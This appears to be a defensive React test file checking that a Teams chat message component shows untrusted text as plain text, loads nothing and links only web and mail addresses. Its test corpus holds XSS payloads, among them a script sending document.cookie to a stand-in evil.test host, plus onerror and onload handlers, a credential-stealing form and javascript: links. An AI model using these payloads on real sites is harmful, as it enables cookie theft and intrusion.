// @vitest-environment jsdom
import { cleanup, render, screen } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { MessageText } from './MessageText';

// A Chat message's text is untrusted Source content (ADR 0004). Teams sync already turns Teams' HTML
// into plain text, but the Section never relies on that: whatever the text holds, it is shown as
// text. Only web and mail addresses become links (which the window sends to the system browser),
// an inline image is never loaded ("[image]" with Open in Teams), and nothing makes a request.

const WEB_URL = 'https://teams.microsoft.com/l/chat/19%3Alaunch%40thread.v2/0';

// Anything in the DOM that could load or run something.
function loaders(container: HTMLElement) {
  return container.querySelectorAll(
    'img, picture, source, video, audio, iframe, frame, object, embed, link, meta, base, script, style, svg, image, form, input, button, [src], [srcset], [style], [background], [poster], [action], [formaction]',
  );
}

// Every attribute name in the DOM, to catch an event handler (onerror, onload…).
const attributeNames = (container: HTMLElement) =>
  [...container.querySelectorAll('*')].flatMap((element) => [...element.attributes].map((attr) => attr.name));

let fetchSpy: ReturnType<typeof vi.fn>;
let xhrOpen: ReturnType<typeof vi.spyOn>;

beforeEach(() => {
  fetchSpy = vi.fn();
  vi.stubGlobal('fetch', fetchSpy);
  xhrOpen = vi.spyOn(XMLHttpRequest.prototype, 'open');
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

// Hostile message text, as raw markup: what a message might hold if anything upstream let it through.
const CORPUS: [string, string][] = [
  ['a script tag', '<script>fetch("https://evil.test/?c="+document.cookie)</script>'],
  ['an image with an error handler', '<img src="https://evil.test/x.png" onerror="alert(1)">'],
  ['an SVG with onload', '<svg onload="alert(1)"><use href="https://evil.test/s.svg#x"/></svg>'],
  ['an event handler on a tag', '<p onmouseover="steal()" style="position:fixed;inset:0">Hover me</p>'],
  ['an inline style with a remote image', '<div style="background:url(https://evil.test/b.png)">Box</div>'],
  ['a style sheet', '<style>@import url("https://evil.test/a.css"); body{display:none}</style>'],
  ['a link tag', '<link rel="stylesheet" href="https://evil.test/a.css">'],
  ['a frame', '<iframe src="https://evil.test/frame"></iframe>'],
  ['a form', '<form action="https://evil.test/steal"><input name="p"><button>Go</button></form>'],
  ['a meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.test">'],
  ['a base tag', '<base href="https://evil.test/">'],
  ['an object', '<object data="https://evil.test/x.swf"></object><embed src="https://evil.test/e">'],
  [
    'a video poster',
    '<video poster="https://evil.test/p.png"><source src="https://evil.test/v.mp4"></video>',
  ],
  ['a javascript: link', '<a href="javascript:alert(1)">Click me</a>'],
  ['a Markdown image', '![tracking](https://evil.test/pixel.png)'],
  ['an entity-escaped tag', '&lt;img src=x onerror=alert(1)&gt;'],
];

describe('showing a message’s text', () => {
  it.each(CORPUS)('shows %s as plain text, loading and running nothing', (_name, text) => {
    const { container } = render(<MessageText text={text} mentions={[]} webUrl={WEB_URL} />);

    expect(loaders(container)).toHaveLength(0);
    expect(attributeNames(container).filter((name) => name.startsWith('on'))).toEqual([]);
    for (const link of container.querySelectorAll('a')) {
      expect(link.getAttribute('href')).toMatch(/^(https?:|mailto:)/);
    }
    // The words are all still there, as text.
    expect(container.textContent?.replace(/\s+/g, '')).toContain(text.replace(/\s+/g, '').slice(0, 20));
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(xhrOpen).not.toHaveBeenCalled();
  });

  it('never makes a link of javascript:, data:, file: or vbscript: addresses', () => {
    render(
      <MessageText
        text={
          'javascript:alert(1) data:text/html,<b>x</b> file:///etc/passwd vbscript:msgbox(1) JaVaScRiPt:x()'
        }
        mentions={[]}
        webUrl={WEB_URL}
      />,
    );
    expect(screen.queryAllByRole('link')).toEqual([]);
  });

  it('makes web and mail addresses links that open in the system browser', () => {
    render(
      <MessageText
        text={'See the plan (https://contoso.test/rollout). Mail mailto:priya@contoso.test.'}
        mentions={[]}
        webUrl={WEB_URL}
      />,
    );
    const links = screen.getAllByRole('link');
    expect(links.map((link) => [link.textContent, link.getAttribute('href')])).toEqual([
      ['https://contoso.test/rollout', 'https://contoso.test/rollout'],
      ['mailto:priya@contoso.test', 'mailto:priya@contoso.test'],
    ]);
    for (const link of links) {
      expect(link.getAttribute('target')).toBe('_blank');
      expect(link.getAttribute('rel')).toContain('noreferrer');
    }
  });

  it('shows an inline image as [image] with Open in Teams, never loading it', () => {
    const { container } = render(
      <MessageText text="Look at this [image] nice" mentions={[]} webUrl={WEB_URL} />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('[image]')).toBeTruthy();
    expect(screen.getByRole('link', { name: /Open in Teams/ }).getAttribute('href')).toBe(WEB_URL);
  });

  it('offers no Open in Teams for an image when the Chat’s address is not a web address', () => {
    render(<MessageText text="[image]" mentions={[]} webUrl="javascript:alert(1)" />);
    expect(screen.queryByRole('link')).toBeNull();
    expect(screen.getByText('[image]')).toBeTruthy();
  });

  it('highlights mentions of the User, keeps paragraphs and line breaks', () => {
    const { container } = render(
      <MessageText
        text={'@Sam Rivera can you look?\nThanks\n\n- one\n- two'}
        mentions={['Sam Rivera']}
        webUrl={WEB_URL}
      />,
    );
    expect(container.querySelector('mark')?.textContent).toBe('@Sam Rivera');
    expect(container.querySelectorAll('p')).toHaveLength(2);
    expect(container.querySelectorAll('br')).toHaveLength(2);
  });
});
